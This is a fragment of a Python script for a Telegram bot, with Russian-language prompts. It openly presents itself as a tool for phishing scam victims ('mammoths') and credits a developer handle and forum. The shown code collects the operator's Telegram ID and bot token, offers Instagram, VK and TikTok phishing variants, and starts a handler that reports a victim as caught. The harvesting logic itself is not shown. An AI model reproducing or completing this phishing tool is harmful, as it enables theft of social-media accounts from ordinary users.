...
print(Fore.GREEN + '#########################################')
print(Fore.GREEN + '+' + Fore.BLUE +  "     Бот для фишинга мамонтов          " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  "       Developer: @BannedRay           " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  "        Forum: arel.pw                 " + Fore.GREEN + '+')
print(Fore.GREEN + '#########################################')
userid = input(Fore.YELLOW +  "Введи ёпта свой Telegram ID > ")
token = input(Fore.BLUE +  "Сюда токен бота подставь > ")
print(Fore.CYAN + '''
[1] Instagram
[2] VK
[3] Tiktok
	''')
choice = input(Fore.MAGENTA +  "Выбери каким вариантом фишинга будем мамонтизировать мамонтов>>> ")
if not choice.isdigit():
	print("Ты чё в глаза долбишься? Цифру введи...")
	exit(0)
choice = int(choice)
...
try:
	bot.send_message(ID, '!У тебя получилось, бот работает!') 
except:
	print("/start в боте напиши")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Чел мамонтизирован!
